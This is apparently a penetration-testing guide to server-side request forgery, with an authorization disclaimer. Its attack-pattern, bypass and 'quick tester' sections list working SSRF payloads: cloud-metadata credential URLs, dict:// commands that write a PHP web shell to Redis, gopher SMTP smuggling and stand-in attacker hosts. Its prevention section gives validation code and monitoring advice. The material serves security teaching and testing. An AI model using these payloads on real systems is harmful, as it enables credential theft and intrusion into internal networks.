# Server-Side Request Forgery (SSRF)

SSRF occurs when an application accepts a user-controlled URL (or URL component) and uses it to make an outbound request without proper validation. This lets attackers make the server request **internal resources** (localhost, private networks, cloud metadata services) or **external systems** (attacker-controlled servers, third parties), often bypassing network access controls and leaking sensitive data.

Impact ranges from information disclosure and credential theft to RCE, internal network pivoting, and cloud account takeover.

> Only test systems you own or are explicitly authorized to assess.

## Why SSRF is dangerous (trust model abuse)
Applications often make outbound requests for legitimate reasons:
- Fetching remote content (webhooks, image processing, PDF generation)
- API integrations (payment processors, analytics, notifications)
- Internal service communication (microservices, admin panels)

The vulnerability appears when:
- User input controls the destination URL (directly or indirectly).
- The server trusts requests originating from itself or the internal network.
- Access controls are enforced by network location, not authentication.

Common trust assumptions that SSRF exploits:
- "Requests from 127.0.0.1 are admin" (bypass front-end auth checks).
- "Internal IPs are trusted" (access unauthenticated admin panels, databases, cloud metadata).
- "Our IP is whitelisted" (abuse the server's identity to access third-party APIs).

## Attack patterns (what you can do with SSRF)

### 1) Localhost / loopback attacks (127.0.0.1, localhost)
Target services bound to localhost that aren't reachable externally.

Classic payload:
```http
POST /product/stock HTTP/1.1
Host: target.tld
Content-Type: application/x-www-form-urlencoded

stockApi=http://localhost/admin
```

What this accesses:
- Admin panels that check "is request from localhost?"
- Debugging endpoints (metrics, profilers, health checks)
- Internal APIs (Redis, Memcached, Elasticsearch on default ports without auth)
- Application servers on alternate ports (8080, 8081, 9000)

Localhost representation variants (useful for bypassing filters):
```text
http://127.0.0.1/admin
http://localhost/admin
http://127.1/admin
http://0.0.0.0/admin
http://[::1]/admin
http://0/admin
http://2130706433/admin (decimal IP)
http://017700000001/admin (octal IP)
http://0x7f000001/admin (hex IP)
```

### 2) Private network scanning and access (RFC 1918 ranges)
Target internal hosts not reachable from the internet.

Common private IP ranges:
```text
10.0.0.0/8
172.16.0.0/12
192.168.0.0/16
```

Example payloads:
```text
http://192.168.0.1/admin
http://192.168.1.1/
http://10.0.0.1:8080/manager
http://172.16.0.5/api/internal
```

Port scanning technique (observe timing/errors):
```text
http://192.168.0.5:22
http://192.168.0.5:80
http://192.168.0.5:443
http://192.168.0.5:3306
http://192.168.0.5:6379
http://192.168.0.5:9200
```

Indicators:
- Different response times (open vs closed/filtered)
- Different error messages
- Different HTTP status codes

### 3) Cloud metadata service exploitation (critical in cloud environments)
Cloud providers expose metadata endpoints at link-local addresses that contain credentials, instance details, and configuration.

AWS metadata (IMDSv1, old/vulnerable):
```text
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/[role-name]
http://169.254.169.254/latest/user-data/
```

AWS metadata (IMDSv2, requires token but sometimes bypassable):
```bash
# Step 1: Get token (if you can control headers)
PUT /latest/api/token HTTP/1.1
X-aws-ec2-metadata-token-ttl-seconds: 21600

# Step 2: Use token
GET /latest/meta-data/iam/security-credentials/ HTTP/1.1
X-aws-ec2-metadata-token: [token]
```

Google Cloud metadata:
```text
http://metadata.google.internal/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
http://metadata/computeMetadata/v1/instance/service-accounts/default/token
```

Requires header: `Metadata-Flavor: Google` (sometimes injectable).

Azure metadata:
```text
http://169.254.169.254/metadata/instance?api-version=2021-02-01
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
```

Requires header: `Metadata: true`.

What you get from metadata services:
- IAM role credentials (temporary AWS keys)
- Service account tokens (GCP/Azure)
- SSH keys, instance user-data
- Network config, security groups

### 4) Internal service exploitation (databases, caches, queues)
Many internal services run without authentication on private networks.

Redis (port 6379, often no auth):
```text
http://192.168.1.10:6379/
```

If you can inject Redis protocol commands via SSRF (protocol smuggling):
```text
dict://192.168.1.10:6379/CONFIG:SET:dir:/var/www/html
dict://192.168.1.10:6379/CONFIG:SET:dbfilename:shell.php
dict://192.168.1.10:6379/SET:payload:"<?php system($_GET['c']); ?>"
dict://192.168.1.10:6379/SAVE
```

Memcached (port 11211):
```text
http://192.168.1.10:11211/
```

Elasticsearch (port 9200):
```text
http://192.168.1.10:9200/
http://192.168.1.10:9200/_cat/indices
http://192.168.1.10:9200/_search?q=password
```

SMTP (protocol smuggling for email sending):
```text
gopher://192.168.1.5:25/_MAIL%20FROM:attacker@evil.com
```

### 5) File protocol access (local file read, if supported)
Some URL parsers/libraries allow `file://` scheme.

```text
file:///etc/passwd
file:///etc/shadow
file:///var/www/html/config.php
file:///c:/windows/win.ini
file:///proc/self/environ
```

### 6) Blind SSRF (no direct response, detect via side channels)
The server makes the request but doesn't return the response to you.

Detection methods:
- Out-of-band interaction (DNS/HTTP to attacker-controlled server):
```text
http://attacker.burpcollaborator.net
http://unique-id.attacker.com
```

- Timing-based (observe response time differences):
```text
http://192.168.1.5:22 (instant reject if closed)
http://192.168.1.5:80 (may hang/timeout if open but unresponsive)
```

- Error-based (different errors for different targets):
```text
http://invalid-host-xyz.local
http://192.168.1.999
```

## Common SSRF injection points (where to look)

### URL parameters (most obvious)
```http
GET /fetch?url=http://example.com HTTP/1.1
GET /proxy?target=http://example.com HTTP/1.1
POST /webhook HTTP/1.1
Content-Type: application/json

{"callback_url": "http://example.com"}
```

### Partial URLs (hostname or path only)
```http
POST /api/fetch HTTP/1.1
Content-Type: application/json

{"host": "example.com", "path": "/api/data"}
```

Exploit:
```json
{"host": "169.254.169.254", "path": "/latest/meta-data/iam/security-credentials/"}
```

### File upload with URL fetch
```http
POST /import HTTP/1.1
Content-Type: application/json

{"file_url": "http://example.com/document.pdf"}
```

### Referer header (analytics/tracking software)
Some analytics tools fetch and parse URLs in the `Referer` header.

```http
GET /page HTTP/1.1
Host: target.tld
Referer: http://169.254.169.254/latest/meta-data/
```

### XML parsing (XXE leading to SSRF)
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<data>&xxe;</data>
```

### PDF generation / document conversion
```http
POST /generate-pdf HTTP/1.1
Content-Type: application/json

{"html": "<img src='http://169.254.169.254/latest/meta-data/'>"}
```

### SVG processing (image uploads)
```xml
<svg xmlns="http://www.w3.org/2000/svg">
  <image href="http://169.254.169.254/latest/meta-data/" />
</svg>
```

## Filter bypass techniques (comprehensive)

### Blacklist bypass (when 127.0.0.1, localhost, or admin are blocked)

#### IP representation variations
```text
http://127.1/
http://0.0.0.0/
http://0/
http://127.0.0.1.nip.io/ (DNS that resolves to 127.0.0.1)
http://spoofed.burpcollaborator.net/ (custom DNS pointing to 127.0.0.1)
http://2130706433/ (decimal: 127*256^3 + 0*256^2 + 0*256 + 1)
http://0177.0.0.1/ (octal)
http://0x7f.0x0.0x0.0x1/ (hex)
http://127.000.000.1/ (leading zeros)
http://[::1]/ (IPv6 loopback)
http://[0:0:0:0:0:0:0:1]/
http://[0:0:0:0:0:ffff:127.0.0.1]/ (IPv4-mapped IPv6)
```

#### URL encoding / double encoding
```text
http://127.0.0.1/%61dmin (URL encode 'a')
http://127.0.0.1/%2561dmin (double encode)
http://127.0.0.1/admin%00 (null byte, historical)
http://127.0.0.1/ADMIN (case variation)
```

#### DNS rebinding (if multiple requests are made)
Create a domain that alternates between safe IP (for validation) and internal IP (for actual request).

#### Redirects (chain through allowed domain)
If `example.com` is whitelisted and you control a redirect:
```text
http://example.com/redirect?to=http://169.254.169.254/latest/meta-data/
```

Or find an open redirect on the target itself:
```text
http://target.tld/redirect?url=http://192.168.1.1/admin
```

### Whitelist bypass (when only certain domains are allowed)

#### Credentials in URL (parser confusion)
```text
https://expected-host:fakepass@evil-host/
https://expected-host@evil-host/
```

Parser may extract "expected-host" for validation but connect to "evil-host".

#### Fragment / anchor (parser confusion)
```text
https://evil-host#expected-host
https://evil-host#@expected-host
```

#### Subdomain tricks
If whitelist checks for "expected-host" substring:
```text
https://expected-host.evil.com/
https://evil.com?expected-host
```

#### URL encoding (validation vs request discrepancy)
```text
https://expected-host%2f@evil-host/
https://expected-host%23@evil-host/
https://expected-host%3f@evil-host/
```

If validator decodes but requester doesn't (or vice versa), mismatch occurs.

#### CRLF injection (if poorly parsed)
```text
https://expected-host%0d%0aHost:%20evil-host/
```

#### IPv6 tricks (if validator doesn't handle IPv6)
```text
http://[::ffff:127.0.0.1]/
http://[::ffff:c0a8:0001]/ (IPv6 for 192.168.0.1)
```

## Testing workflow (systematic SSRF discovery)

### Step 1: Identify URL-based inputs
Look for parameters/fields that:
- Accept full URLs
- Accept hostnames, IPs, or paths
- Trigger outbound requests (webhooks, imports, fetches, proxies, redirects)

### Step 2: Baseline behavior
Send a safe external URL:
```text
http://example.com
```

Observe:
- Response time
- Response content
- Error messages
- Side effects (logs, emails, external requests)

### Step 3: Test localhost access
```text
http://127.0.0.1/
http://localhost/
http://0.0.0.0/
```

Look for:
- Different response (content, length, status)
- Internal service banners
- Admin interfaces

### Step 4: Enumerate internal services (where authorized)
Port scan localhost:
```text
http://127.0.0.1:80
http://127.0.0.1:8080
http://127.0.0.1:3000
http://127.0.0.1:6379
http://127.0.0.1:9200
```

Scan private IPs:
```text
http://192.168.0.1/
http://192.168.1.1/
http://10.0.0.1/
```

### Step 5: Test cloud metadata (if in cloud environment)
```text
http://169.254.169.254/latest/meta-data/
http://metadata.google.internal/computeMetadata/v1/
```

### Step 6: Test blind SSRF (if no response returned)
Use out-of-band detection:
```text
http://unique-id.burpcollaborator.net
http://ssrf-test.attacker.com
```

Check for DNS/HTTP callbacks.

### Step 7: Exploit deeper
- Fetch credentials from metadata
- Access admin panels
- Exfiltrate internal API responses
- Chain with other bugs (open redirect, XXE)

## Real-world impact examples (what attackers do)

### Scenario 1: Cloud credential theft
```text
1. Find SSRF in image fetch endpoint
2. Request http://169.254.169.254/latest/meta-data/iam/security-credentials/web-server-role
3. Extract temporary AWS keys from response
4. Use keys to access S3 buckets, RDS databases, other AWS resources
```

### Scenario 2: Internal admin panel access
```text
1. Find SSRF in PDF generator
2. Request http://localhost:8080/admin
3. Bypass "localhost-only" restriction
4. Extract user database, change passwords, elevate privileges
```

### Scenario 3: Redis exploitation → RCE
```text
1. Find SSRF supporting gopher:// or dict://
2. Use protocol smuggling to send Redis commands
3. Write web shell to disk via Redis persistence
4. Access web shell for RCE
```

### Scenario 4: Port scanning and pivoting
```text
1. Find blind SSRF
2. Scan internal network for open ports (timing-based)
3. Identify internal services (SSH, databases, admin panels)
4. Use as pivot point to map internal infrastructure
```

## Prevention (what developers must do)

### 1) Validate and sanitize URLs (defense in depth)
- Allow-list protocols: only `http://` and `https://` (no `file://`, `gopher://`, `dict://`, etc.)
- Allow-list domains/IPs: only external, public destinations
- Deny private IPs and localhost by default

IP deny-list (Python example):
```python
import ipaddress

def is_private_ip(hostname):
    try:
        ip = ipaddress.ip_address(hostname)
        return ip.is_private or ip.is_loopback or ip.is_link_local
    except:
        return False

def validate_url(url):
    parsed = urlparse(url)
    if parsed.scheme not in ['http', 'https']:
        raise ValueError("Invalid protocol")
    
    if is_private_ip(parsed.hostname):
        raise ValueError("Private IP not allowed")
```

### 2) Resolve hostnames and check resolved IPs
Don't just validate the hostname string; resolve it and check the IP.

```python
import socket

def get_ip(hostname):
    return socket.gethostbyname(hostname)

def validate_destination(url):
    hostname = urlparse(url).hostname
    ip = get_ip(hostname)
    if is_private_ip(ip):
        raise ValueError("Resolves to private IP")
```

Beware DNS rebinding: re-check IP immediately before making the actual request.

### 3) Use separate, restricted network contexts
- Run outbound request functionality in isolated containers/VMs with no access to internal networks.
- Use egress firewalls to block private IP ranges and cloud metadata endpoints.
- Use network policies to deny access to localhost and RFC 1918 ranges.

### 4) Disable unnecessary protocols and redirects
- Configure HTTP client libraries to reject redirects or limit redirect chains.
- Disable file://, gopher://, dict://, ftp://, etc.

Python requests example:
```python
import requests

response = requests.get(url, allow_redirects=False, timeout=5)
```

### 5) Use allow-lists for known-good destinations
If the application only needs to fetch from a few external APIs, allow-list them explicitly.

```python
ALLOWED_HOSTS = ['api.example.com', 'cdn.example.com']

def validate_url(url):
    hostname = urlparse(url).hostname
    if hostname not in ALLOWED_HOSTS:
        raise ValueError("Host not allowed")
```

### 6) Metadata service protections (cloud-specific)
AWS: Enable IMDSv2 (requires token, harder to exploit via SSRF):
```bash
aws ec2 modify-instance-metadata-options \
    --instance-id i-1234567890abcdef0 \
    --http-tokens required \
    --http-put-response-hop-limit 1
```

GCP: Use Workload Identity instead of relying on metadata service.

Azure: Use Managed Identities with restricted scopes.

### 7) Monitoring and detection
Log all outbound requests:
- Destination (hostname, IP, port)
- Source (which user/request triggered it)
- Response (status, size, timing)

Alert on:
- Requests to private IPs or localhost
- Requests to cloud metadata endpoints
- Unusual ports (6379, 9200, etc.)
- High volumes of failed requests (scanning behavior)

## Quick tester payload set (authorized use)

Localhost variants:
```text
http://127.0.0.1/
http://localhost/
http://127.1/
http://0.0.0.0/
http://[::1]/
http://2130706433/
```

Private network targets:
```text
http://192.168.0.1/
http://10.0.0.1/
http://172.16.0.1/
```

Cloud metadata:
```text
http://169.254.169.254/latest/meta-data/
http://metadata.google.internal/computeMetadata/v1/
```

Port scan (observe timing):
```text
http://127.0.0.1:22
http://127.0.0.1:80
http://127.0.0.1:443
http://127.0.0.1:3306
http://127.0.0.1:6379
http://127.0.0.1:9200
```

Blind SSRF detection:
```text
http://unique-id.burpcollaborator.net
http://ssrf-test.attacker.com
```
